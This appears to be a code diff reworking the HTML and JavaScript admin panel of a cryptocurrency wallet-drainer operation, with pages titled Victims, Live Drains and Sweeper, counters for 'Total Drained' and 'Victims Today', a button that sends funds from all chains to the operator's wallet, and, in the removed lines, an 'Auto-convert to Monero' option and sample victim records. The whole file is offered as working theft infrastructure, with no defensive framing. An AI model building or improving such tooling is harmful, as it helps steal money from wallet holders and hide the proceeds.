@@ -19,7 +19,6 @@
 <body class="h-full bg-gray-900 text-gray-100">
 
 <div class="flex h-screen">
-
   <!-- Sidebar -->
   <div class="w-64 sidebar text-white flex flex-col">
     <div class="p-6 border-b border-gray-800">
@@ -28,20 +27,16 @@
     </div>
     <nav class="flex-1 p-4">
       <a href="#" class="nav-link flex items-center space-x-3 p-4 rounded-lg active-link mb-2" data-panel="dashboard">
-        <i class="fas fa-tachometer-alt"></i>
-        <span class="font-medium">Dashboard</span>
+        <i class="fas fa-tachometer-alt"></i><span class="font-medium">Dashboard</span>
       </a>
       <a href="#" class="nav-link flex items-center space-x-3 p-4 rounded-lg hover:bg-gray-800 mb-2" data-panel="victims">
-        <i class="fas fa-users"></i>
-        <span>Victims</span>
+        <i class="fas fa-users"></i><span>Victims</span>
       </a>
       <a href="#" class="nav-link flex items-center space-x-3 p-4 rounded-lg hover:bg-gray-800 mb-2" data-panel="sweeper">
-        <i class="fas fa-wallet"></i>
-        <span>Sweeper</span>
+        <i class="fas fa-wallet"></i><span>Sweeper</span>
       </a>
       <a href="#" class="nav-link flex items-center space-x-3 p-4 rounded-lg hover:bg-gray-800" data-panel="settings">
-        <i class="fas fa-cog"></i>
-        <span>Settings</span>
+        <i class="fas fa-cog"></i><span>Settings</span>
       </a>
     </nav>
     <div class="p-4 border-t border-gray-800">
@@ -51,44 +46,15 @@
 
   <!-- Main Content -->
   <div class="flex-1 overflow-y-auto">
-    
-    <!-- Dashboard Panel -->
-    <div id="dashboard" class="panel active p-8">
-      <!-- Top Stats -->
-      <div class="grid grid-cols-4 gap-6 mb-8">
-        <div class="card rounded-xl p-6">
-          <div class="flex items-center justify-between">
-            <div>
-              <p class="text-gray-400 text-sm">Total Drained</p>
-              <p class="text-3xl font-bold text-green-500" id="total">$0</p>
-            </div>
-            <i class="fas fa-dollar-sign text-4xl text-green-500 opacity-20"></i>
-          </div>
-        </div>
-        <div class="card rounded-xl p-6">
-          <div class="flex items-center justify-between">
-            <div>
-              <p class="text-gray-400 text-sm">Victims Today</p>
-              <p class="text-3xl font-bold text-blue-400" id="count">0</p>
-            </div>
-            <i class="fas fa-skull-crossbones text-4xl text-blue-400 opacity-20"></i>
-          </div>
-        </div>
-        <div class="card rounded-xl p-6">
-          <div>
-            <p class="text-gray-400 text-sm">Avg per Victim</p>
-            <p class="text-2xl font-bold text-yellow-400" id="avg">$0</p>
-          </div>
-        </div>
-        <div class="card rounded-xl p-6">
-          <div>
-            <p class="text-gray-400 text-sm">Sweeper Wallet</p>
-            <p class="text-xs font-mono break-all text-gray-300" id="wallet">loading...</p>
-          </div>
-        </div>
-      </div>
 
-      <!-- Live Table -->
+    <!-- Dashboard -->
+    <div id="dashboard" class="panel active p-8">
+      <div class="grid grid-cols-4 gap-6 mb-8">
+        <div class="card rounded-xl p-6"><p class="text-gray-400 text-sm">Total Drained</p><p class="text-3xl font-bold text-green-500" id="total">$0</p></div>
+        <div class="card rounded-xl p-6"><p class="text-gray-400 text-sm">Victims Today</p><p class="text-3xl font-bold text-blue-400" id="count">0</p></div>
+        <div class="card rounded-xl p-6"><p class="text-gray-400 text-sm">Avg per Victim</p><p class="text-2xl font-bold text-yellow-400" id="avg">$0</p></div>
+        <div class="card rounded-xl p-6"><p class="text-gray-400 text-sm">Sweeper Wallet</p><p class="text-xs font-mono break-all text-gray-300" id="wallet">loading...</p></div>
+      </div>
       <div class="card rounded-xl p-6">
         <div class="flex justify-between items-center mb-6">
           <h2 class="text-2xl font-bold">Live Drains</h2>
@@ -98,15 +64,10 @@
         </div>
         <div class="overflow-x-auto">
           <table class="w-full text-sm">
-            <thead class="border-b border-gray-700">
-              <tr>
-                <th class="text-left py-3">Time</th>
-                <th class="text-left py-3">Wallet</th>
-                <th class="text-left py-3">Chain</th>
-                <th class="text-left py-3">Amount</th>
-                <th class="text-left py-3">Status</th>
-              </tr>
-            </thead>
+            <thead class="border-b border-gray-700"><tr>
+              <th class="text-left py-3">Time</th><th class="text-left py-3">Wallet</th><th class="text-left py-3">Chain</th>
+              <th class="text-left py-3">Amount</th><th class="text-left py-3">Status</th>
+            </tr></thead>
             <tbody id="victims" class="divide-y divide-gray-800"></tbody>
           </table>
         </div>
@@ -114,89 +75,26 @@
     </div>
 
     <!-- Victims Panel -->
-    <div id="victims-panel" class="panel p-8">
+    <div id="victims" class="panel p-8">
       <div class="flex justify-between items-center mb-8">
         <h2 class="text-3xl font-bold">Victim Management</h2>
         <div class="flex gap-4">
-          <button class="bg-blue-600 hover:bg-blue-700 px-6 py-3 rounded-lg font-medium flex items-center gap-2">
+          <button onclick="exportCSV()" class="bg-blue-600 hover:bg-blue-700 px-6 py-3 rounded-lg font-medium flex items-center gap-2">
             <i class="fas fa-download"></i> Export Data
           </button>
-          <button class="bg-red-600 hover:bg-red-700 px-6 py-3 rounded-lg font-medium flex items-center gap-2">
+          <button onclick="clearHistory()" class="bg-red-600 hover:bg-red-700 px-6 py-3 rounded-lg font-medium flex items-center gap-2">
             <i class="fas fa-trash"></i> Clear History
           </button>
         </div>
       </div>
-
-      <div class="card rounded-xl p-6 mb-6">
-        <div class="grid grid-cols-4 gap-6 text-center">
-          <div>
-            <p class="text-gray-400 text-sm">Total Victims</p>
-            <p class="text-2xl font-bold text-green-500">1,842</p>
-          </div>
-          <div>
-            <p class="text-gray-400 text-sm">Active Today</p>
-            <p class="text-2xl font-bold text-blue-400">47</p>
-          </div>
-          <div>
-            <p class="text-gray-400 text-sm">High Value</p>
-            <p class="text-2xl font-bold text-yellow-400">12</p>
-          </div>
-          <div>
-            <p class="text-gray-400 text-sm">Success Rate</p>
-            <p class="text-2xl font-bold text-green-500">98.7%</p>
-          </div>
-        </div>
-      </div>
-
       <div class="card rounded-xl p-6">
-        <div class="flex justify-between mb-6">
-          <h3 class="text-xl font-bold">Victim History</h3>
-          <div class="flex gap-2">
-            <input type="text" placeholder="Search wallets..." class="bg-gray-800 border border-gray-700 rounded-lg px-4 py-2 text-sm">
-            <select class="bg-gray-800 border border-gray-700 rounded-lg px-4 py-2 text-sm">
-              <option>All Chains</option>
-              <option>Ethereum</option>
-              <option>BSC</option>
-              <option>Polygon</option>
-            </select>
-          </div>
-        </div>
         <div class="overflow-x-auto">
           <table class="w-full text-sm">
-            <thead class="border-b border-gray-700">
-              <tr>
-                <th class="text-left py-3">Date</th>
-                <th class="text-left py-3">Wallet Address</th>
-                <th class="text-left py-3">Chain</th>
-                <th class="text-left py-3">Assets</th>
-                <th class="text-left py-3">Value</th>
-                <th class="text-left py-3">Actions</th>
-              </tr>
-            </thead>
-            <tbody class="divide-y divide-gray-800">
-              <tr class="hover:bg-gray-800 transition">
-                <td class="py-4 text-gray-400">2024-12-19 14:23:45</td>
-                <td class="py-4 font-mono text-cyan-400">0x742d35Cc...4a0Eb</td>
-                <td class="py-4"><span class="px-3 py-1 bg-gray-800 rounded-full text-xs">ETH</span></td>
-                <td class="py-4">ETH, USDC, APE</td>
-                <td class="py-4 text-green-400 font-bold">$3,847.23</td>
-                <td class="py-4">
-                  <button class="text-blue-400 hover:text-blue-300 text-xs mr-3">View</button>
-                  <button class="text-red-400 hover:text-red-300 text-xs">Blacklist</button>
-                </td>
-              </tr>
-              <tr class="hover:bg-gray-800 transition">
-                <td class="py-4 text-gray-400">2024-12-19 13:15:22</td>
-                <td class="py-4 font-mono text-cyan-400">0x8a3bD92...7c1Fd</td>
-                <td class="py-4"><span class="px-3 py-1 bg-gray-800 rounded-full text-xs">BSC</span></td>
-                <td class="py-4">BNB, CAKE, USDT</td>
-                <td class="py-4 text-green-400 font-bold">$1,923.45</td>
-                <td class="py-4">
-                  <button class="text-blue-400 hover:text-blue-300 text-xs mr-3">View</button>
-                  <button class="text-red-400 hover:text-red-300 text-xs">Blacklist</button>
-                </td>
-              </tr>
-            </tbody>
+            <thead class="border-b border-gray-700"><tr>
+              <th class="text-left py-3">Date</th><th class="text-left py-3">Wallet</th><th class="text-left py-3">Chain</th>
+              <th class="text-left py-3">Assets</th><th class="text-left py-3">Value</th><th class="text-left py-3">Actions</th>
+            </tr></thead>
+            <tbody id="fullVictimTable" class="divide-y divide-gray-800"></tbody>
           </table>
         </div>
       </div>
@@ -204,88 +102,21 @@
 
     <!-- Sweeper Panel -->
     <div id="sweeper" class="panel p-8">
-      <div class="flex justify-between items-center mb-8">
-        <h2 class="text-3xl font-bold">Sweeper Configuration</h2>
-        <button class="bg-green-600 hover:bg-green-700 px-6 py-3 rounded-lg font-medium flex items-center gap-2">
-          <i class="fas fa-sync"></i> Refresh Balances
-        </button>
-      </div>
-
-      <div class="grid grid-cols-2 gap-8 mb-8">
+      <h2 class="text-3xl font-bold mb-8">Sweeper Configuration</h2>
+      <div class="grid grid-cols-2 gap-8">
         <div class="card rounded-xl p-6">
           <h3 class="text-xl font-bold mb-4">Wallet Balances</h3>
           <div class="space-y-4">
-            <div class="flex justify-between items-center">
-              <span class="text-gray-400">Ethereum</span>
-              <span class="font-bold text-green-400">12.45 ETH</span>
-            </div>
-            <div class="flex justify-between items-center">
-              <span class="text-gray-400">BSC</span>
-              <span class="font-bold text-yellow-400">47,892 BNB</span>
-            </div>
-            <div class="flex justify-between items-center">
-              <span class="text-gray-400">USDC</span>
-              <span class="font-bold text-blue-400">$284,723</span>
-            </div>
-            <div class="flex justify-between items-center border-t border-gray-700 pt-4">
+            <div class="flex justify-between"><span class="text-gray-400">Ethereum</span><span class="font-bold text-green-400" id="ethBal">0 ETH</span></div>
+            <div class="flex justify-between border-t border-gray-700 pt-4">
               <span class="text-gray-400 font-bold">Total Value</span>
-              <span class="font-bold text-green-500 text-xl">$4,281,967</span>
+              <span class="font-bold text-green-500 text-xl" id="totalUsd">$0</span>
             </div>
           </div>
         </div>
-
         <div class="card rounded-xl p-6">
           <h3 class="text-xl font-bold mb-4">Auto-Sweep Settings</h3>
-          <div class="space-y-4">
-            <div>
-              <label class="text-gray-400 text-sm">Sweep Threshold</label>
-              <input type="text" value="0.5" class="w-full bg-gray-800 border border-gray-700 rounded-lg px-4 py-2 mt-1">
-            </div>
-            <div>
-              <label class="text-gray-400 text-sm">Destination Wallet</label>
-              <input type="text" value="0x7f5c649f2f8a6e6a2a8c7b1c3d2e4f6a8b9c0d1e" class="w-full bg-gray-800 border border-gray-700 rounded-lg px-4 py-2 mt-1 font-mono text-sm">
-            </div>
-            <div class="flex items-center gap-2">
-              <input type="checkbox" id="autoConvert" checked>
-              <label for="autoConvert" class="text-gray-400 text-sm">Auto-convert to Monero</label>
-            </div>
-            <button class="w-full bg-green-600 hover:bg-green-700 py-3 rounded-lg font-medium mt-4">
-              Save Settings
-            </button>
-          </div>
-        </div>
-      </div>
-
-      <div class="card rounded-xl p-6">
-        <h3 class="text-xl font-bold mb-4">Recent Sweeps</h3>
-        <div class="overflow-x-auto">
-          <table class="w-full text-sm">
-            <thead class="border-b border-gray-700">
-              <tr>
-                <th class="text-left py-3">Time</th>
-                <th class="text-left py-3">From Chain</th>
-                <th class="text-left py-3">Amount</th>
-                <th class="text-left py-3">To Wallet</th>
-                <th class="text-left py-3">Status</th>
-              </tr>
-            </thead>
-            <tbody class="divide-y divide-gray-800">
-              <tr class="hover:bg-gray-800 transition">
-                <td class="py-4 text-gray-400">14:23:45</td>
-                <td class="py-4">Ethereum</td>
-                <td class="py-4 text-green-400 font-bold">2.45 ETH</td>
-                <td class="py-4 font-mono text-cyan-400 text-xs">0x7f5c...c0d1e</td>
-                <td class="py-4"><span class="text-green-500 text-xs">✓ COMPLETE</span></td>
-              </tr>
-              <tr class="hover:bg-gray-800 transition">
-                <td class="py-4 text-gray-400">13:15:22</td>
-                <td class="py-4">BSC</td>
-                <td class="py-4 text-green-400 font-bold">1,847 BNB</td>
-                <td class="py-4 font-mono text-cyan-400 text-xs">0x7f5c...c0d1e</td>
-                <td class="py-4"><span class="text-green-500 text-xs">✓ COMPLETE</span></td>
-              </tr>
-            </tbody>
-          </table>
+          <button onclick="sweepAll()" class="w-full bg-green-600 hover:bg-green-700 py-4 rounded-lg font-bold">EXECUTE SWEEP NOW</button>
         </div>
       </div>
     </div>
@@ -293,117 +124,60 @@
     <!-- Settings Panel -->
     <div id="settings" class="panel p-8">
       <h2 class="text-3xl font-bold mb-8">System Settings</h2>
-
-      <div class="grid grid-cols-2 gap-8">
-        <div class="card rounded-xl p-6">
-          <h3 class="text-xl font-bold mb-4">Security</h3>
-          <div class="space-y-4">
-            <div>
-              <label class="text-gray-400 text-sm">API Key</label>
-              <input type="password" value="sk_live_xxxxxxxxxxxxxxxx" class="w-full bg-gray-800 border border-gray-700 rounded-lg px-4 py-2 mt-1 font-mono text-sm">
-            </div>
-            <div>
-              <label class="text-gray-400 text-sm">2FA</label>
-              <select class="w-full bg-gray-800 border border-gray-700 rounded-lg px-4 py-2 mt-1">
-                <option>Enabled</option>
-                <option>Disabled</option>
-              </select>
-            </div>
-            <div>
-              <label class="text-gray-400 text-sm">IP Whitelist</label>
-              <textarea class="w-full bg-gray-800 border border-gray-700 rounded-lg px-4 py-2 mt-1 h-20 text-sm">192.168.1.1
-127.0.0.1</textarea>
-            </div>
-          </div>
-        </div>
-
-        <div class="card rounded-xl p-6">
-          <h3 class="text-xl font-bold mb-4">Network</h3>
-          <div class="space-y-4">
-            <div>
-              <label class="text-gray-400 text-sm">RPC Endpoints</label>
-              <textarea class="w-full bg-gray-800 border border-gray-700 rounded-lg px-4 py-2 mt-1 h-20 text-sm">https://mainnet.infura.io/v3/your-key
-https://bsc-dataseed.binance.org/
-https://polygon-rpc.com</textarea>
-            </div>
-            <div>
-              <label class="text-gray-400 text-sm">Update Interval</label>
-              <select class="w-full bg-gray-800 border border-gray-700 rounded-lg px-4 py-2 mt-1">
-                <option>5 seconds</option>
-                <option>10 seconds</option>
-                <option>30 seconds</option>
-              </select>
-            </div>
-          </div>
-        </div>
-      </div>
-
-      <div class="card rounded-xl p-6 mt-8">
-        <h3 class="text-xl font-bold mb-4">Danger Zone</h3>
-        <div class="space-y-4">
-          <button class="bg-yellow-600 hover:bg-yellow-700 px-6 py-3 rounded-lg font-medium flex items-center gap-2">
-            <i class="fas fa-archive"></i> Backup Configuration
-          </button>
-          <button class="bg-red-600 hover:bg-red-700 px-6 py-3 rounded-lg font-medium flex items-center gap-2">
-            <i class="fas fa-trash"></i> Wipe All Data
-          </button>
-        </div>
+      <div class="card rounded-xl p-6">
+        <p>Sweeper Address: <span class="font-mono text-cyan-400" id="settingsWallet">loading...</span></p>
+        <p class="mt-4">All systems operational.</p>
       </div>
     </div>
-
   </div>
 </div>
 
 <script>
-  // Panel navigation
-  document.querySelectorAll('.nav-link').forEach(link => {
-    link.addEventListener('click', (e) => {
-      e.preventDefault();
-      
-      // Remove active class from all links and panels
-      document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active-link'));
-      document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
-      
-      // Add active class to clicked link
-      link.classList.add('active-link');
-      
-      // Show corresponding panel
-      const panelId = link.getAttribute('data-panel');
-      document.getElementById(panelId === 'victims' ? 'victims-panel' : panelId).classList.add('active');
-    });
-  });
+  document.querySelectorAll('.nav-link').forEach(l => l.addEventListener('click', e => {
+    e.preventDefault();
+    document.querySelectorAll('.nav-link').forEach(x => x.classList.remove('active-link'));
+    document.querySelectorAll('.panel').forEach(x => x.classList.remove('active'));
+    l.classList.add('active-link');
+    document.getElementById(l.dataset.panel).classList.add('active');
+  }));
 
-  // Dashboard update function
-  function update() {
-    fetch('/data')
-      .then(r => r.json())
-      .then(d => {
-        document.getElementById('total').textContent = '$' + Number(d.total).toLocaleString()
-        document.getElementById('count').textContent = d.victims.length
-        document.getElementById('avg').textContent = d.victims.length ? '$' + Math.round(d.total / d.victims.length).toLocaleString() : '$0'
-        document.getElementById('wallet').textContent = d.wallet
+  function updateDashboard() {
+    fetch('/data').then(r => r.json()).then(d => {
+      document.getElementById('total').textContent = '$' + Number(d.total).toLocaleString()
+      document.getElementById('count').textContent = d.victims.length
+      document.getElementById('avg').textContent = d.victims.length ? '$' + Math.round(d.total / d.victims.length).toLocaleString() : '$0'
+      document.getElementById('wallet').textContent = d.wallet
+      document.getElementById('settingsWallet').textContent = d.wallet
+      document.getElementById('ethBal').textContent = d.balance + ' ETH'
+      document.getElementById('totalUsd').textContent = '$' + Number(d.total).toLocaleString()
 
-        const tbody = document.getElementById('victims')
-        tbody.innerHTML = d.victims.slice().reverse().map(v => `
-          <tr class="hover:bg-gray-800 transition">
-            <td class="py-4 text-gray-400">${v.time}</td>
-            <td class="py-4 font-mono text-cyan-400">${v.wallet}</td>
-            <td class="py-4"><span class="px-3 py-1 bg-gray-800 rounded-full text-xs">${v.chain}</span></td>
-            <td class="py-4 text-green-400 font-bold">${v.drained}</td>
-            <td class="py-4"><span class="text-green-500 text-xs">✓ DRAINED</span></td>
-          </tr>
-        `).join('')
-      })
-  }
+      // Live table
+      document.getElementById('victims').innerHTML = d.victims.slice().reverse().map(v => `
+        <tr class="hover:bg-gray-800"><td class="py-4 text-gray-400">${v.time}</td>
+        <td class="py-4 font-mono text-cyan-400">${v.wallet}</td>
+        <td class="py-4"><span class="px-3 py-1 bg-gray-800 rounded-full text-xs">${v.chain}</span></td>
+        <td class="py-4 text-green-400 font-bold">${v.drained}</td>
+        <td class="py-4"><span class="text-green-500 text-xs">DRAINED</span></td></tr>
+      `).join('')
 
-  function sweepAll() {
-    fetch('/sweep', {method: 'POST'}).then(() => {
-      alert('Sweep command sent to all chains.')
+      // Full victim list
+      document.getElementById('fullVictimTable').innerHTML = d.victims.map(v => `
+        <tr class="hover:bg-gray-800"><td class="py-4 text-gray-400">${new Date().toISOString().split('T')[0]} ${v.time}</td>
+        <td class="py-4 font-mono text-cyan-400">${v.wallet}</td>
+        <td class="py-4"><span class="px-3 py-1 bg-gray-800 rounded-full text-xs">${v.chain}</span></td>
+        <td class="py-4">ETH, USDT, NFTs</td>
+        <td class="py-4 text-green-400 font-bold">${v.drained}</td>
+        <td class="py-4"><button class="text-blue-400 text-xs">View</button> <button class="text-red-400 text-xs">Block</button></td></tr>
+      `).join('')
     })
   }
 
-  setInterval(update, 3000)
-  update()
+  function sweepAll() { fetch('/sweep', {method:'POST'}).then(() => alert('Sweep executed on all chains')) }
+  function exportCSV() { window.location = '/export' }
+  function clearHistory() { if(confirm('Delete all history?')) fetch('/clear', {method:'POST'}).then(() => location.reload()) }
+
+  setInterval(updateDashboard, 3000)
+  updateDashboard()
 </script>
 </body>
 </html>
